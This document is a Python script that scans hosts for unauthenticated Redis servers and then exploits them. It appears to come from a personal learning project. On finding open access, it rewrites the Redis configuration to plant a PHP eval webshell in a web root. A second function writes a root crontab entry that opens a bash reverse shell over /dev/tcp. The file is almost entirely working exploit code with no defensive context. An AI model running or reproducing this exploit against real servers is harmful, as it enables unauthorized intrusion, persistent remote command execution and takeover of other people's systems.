# -*- coding: utf-8 -*-
# @Time    : 12 2月 2025 11:26 下午
# @Author  : codervibe
# @File    : redisScan.py
# @Project : pythonBasics

import socket
import redis

def scan_port(ip):
    """
    检查指定 IP 的 Redis 端口是否开放。

    :param ip: 需要扫描的 IP 地址
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.3)  # 设置超时时间
    try:
        s.connect((ip, 6379))  # 尝试连接到 Redis 默认端口 6379
        print(f"[+] {ip} 的 6379 端口上有 Redis 服务")
        s.close()
        check_redis_connect(ip)
    except socket.error:
        print("[-] 6379 端口已关闭")
        return

def check_redis_connect(ip):
    """
    检查指定 IP 的 Redis 是否存在未授权访问问题。

    :param ip: 需要检查的 IP 地址
    """
    try:
        r = redis.StrictRedis(host=ip, port=6379, socket_timeout=0.3)
        info = r.info()  # 获取 Redis 服务器信息
        if info:
            print(f"[+] {ip}  存在未授权访问")
            print(f"[+] {r.client_list()}")
            exp_webShell(r)
        else:
            print(f"[-] {ip} 不存在未授权访问")
    except redis.ConnectionError:
        print(f"[-] 无法连接到 {ip}:6379")
        return

def exp_webShell(redis_client):
    """
    利用 Redis 未授权访问写入 webshell。

    :param redis_client: Redis 客户端对象
    """
    root = 'D:/phpstudy_pro/WWW'
    redis_client.config_set('dir', root)
    redis_client.config_set('dbfilename', 'shell.php')
    redis_client.set('x', "<?php @eval($_POST['hihack']);?>")
    redis_client.save()
    print(f"[+] webshell 写入成功")

def exp_crontab(redis_client):
    """
    利用 Redis 未授权访问创建恶意定时任务。

    :param redis_client: Redis 客户端对象
    """
    root = '/var/spool/cron'
    redis_client.config_set('dir', root)
    redis_client.config_set('dbfilename', 'root')
    redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i > & /dev/tcp/127.0.0.1/8888 0>&1\n\n')
    redis_client.save()
    print(f"[+] 定时任务已创建")

